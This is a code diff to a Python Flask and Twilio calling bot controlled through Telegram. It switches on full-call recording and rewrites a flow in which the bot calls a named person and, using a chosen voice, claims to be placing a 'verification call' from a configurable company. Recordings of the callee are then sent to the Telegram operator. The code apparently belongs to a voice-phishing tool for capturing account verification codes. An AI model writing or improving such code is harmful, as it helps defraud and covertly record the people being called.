@@ -2288,7 +2288,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                     webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
-                    call_record=False,
+                    call_record=True,  # CRITICAL: Enable full-call recording from start to end
                 )
                 if not sid:
                     raise Exception("Failed to create normal call")
@@ -3245,15 +3245,19 @@ def normal_advanced_flow():
 @app.route("/focus_listen_flow", methods=["POST"])
 @twilio_request_logger("/focus_listen_flow")
 def focus_listen_flow():
-    """Pre-script flow: Bot speaks first, then records caller response.
+    """Professional pre-script flow with full-call recording.
 
+    IMPORTANT: The entire call is recorded at the CALL LEVEL (from start to finish).
+    This endpoint just delivers the greeting and redirects to the script.
+    
     Flow:
-    1. Speak greeting (so user knows bot is there)
-    2. Record caller response (up to 60 seconds, 3 seconds of silence ends it)
-    3. Redirect to /normal_advanced_flow with full script
-    4. Recording callback sent to /recording_callback
+    1. Speak professional greeting
+    2. Pause briefly
+    3. Redirect to /normal_advanced_flow for main script
+    4. Call-level recording captures EVERYTHING (greeting + script + caller audio)
+    5. Recording sent to Telegram via /twilio/recording callback
     """
-    from twilio.twiml.voice_response import VoiceResponse, Record
+    from twilio.twiml.voice_response import VoiceResponse
 
     user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
     chat_id = request.values.get("chat_id") or request.args.get("chat_id")
@@ -3279,50 +3283,33 @@ def focus_listen_flow():
 
     resp = VoiceResponse()
     
-    # CRITICAL: Bot must speak FIRST so user knows it's working
-    greeting = f"Hello {name}. This is a verification call from {company}. Please hold."
+    # Professional greeting (will be captured in full-call recording)
+    greeting = f"Hello {name}. This is a verification call from {company}. Please hold while we verify your account."
+    
     try:
         # Try to play audio greeting
         greeting_audio = generate_call_audio(user_id, greeting, voice_id, "focus_greeting.mp3")
         if greeting_audio:
             resp.play(greeting_audio)
-            logger.info(f"[FOCUS_LISTEN] Playing audio greeting")
+            logger.info(f"[FOCUS_LISTEN] ✅ Audio greeting queued for {call_sid[:8]}")
         else:
-            # Fallback to TTS
+            # Fallback to TTS if audio generation fails
             resp.say(greeting)
-            logger.info(f"[FOCUS_LISTEN] Using TTS greeting (audio generation failed)")
+            logger.info(f"[FOCUS_LISTEN] ⚠️  TTS fallback (audio generation failed)")
     except Exception as e:
-        logger.warning(f"[FOCUS_LISTEN] Greeting error: {e}, using TTS fallback")
+        logger.error(f"[FOCUS_LISTEN] Greeting error: {e}, using TTS")
         resp.say(greeting)
     
     resp.pause(length=1)
     
-    # Now record the caller's response
-    try:
-        # Build recording callback URL - MUST include user_id and chat_id
-        rec_cb = f"{NGROK_URL.rstrip('/')}/recording_callback?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
-        
-        logger.info(f"[FOCUS_LISTEN] Setting up recording callback: {rec_cb[:80]}...")
-        
-        # Record the caller - action URL redirects to /normal_advanced_flow after recording
-        resp.record(
-            action=f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id or 'unknown'))}",
-            method="POST",
-            max_length=60,
-            timeout=3,
-            play_beep=False,
-            trim="do-not-trim",
-            recording_status_callback=rec_cb,
-            recording_status_callback_method="POST"
-        )
-        logger.info(f"[FOCUS_LISTEN] Recording setup complete for {call_sid[:8]}")
-    except Exception as e:
-        logger.error(f"[FOCUS_LISTEN] Record setup failed: {e}")
-        # Fallback: skip recording and go straight to script
-        resp.redirect(f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id or 'unknown'))}", method="POST")
+    # Redirect to main script - NO recording verb here since call-level recording handles it
+    logger.info(f"[FOCUS_LISTEN] Redirecting to /normal_advanced_flow for script delivery")
+    resp.redirect(
+        f"/normal_advanced_flow?user_id={quote_plus(str(user_id))}&chat_id={quote_plus(str(chat_id or 'unknown'))}",
+        method="POST"
+    )
 
+    logger.info(f"[FOCUS_LISTEN] END: Full-call recording active, everything will be captured")
     return Response(str(resp), content_type="application/xml")
 
 
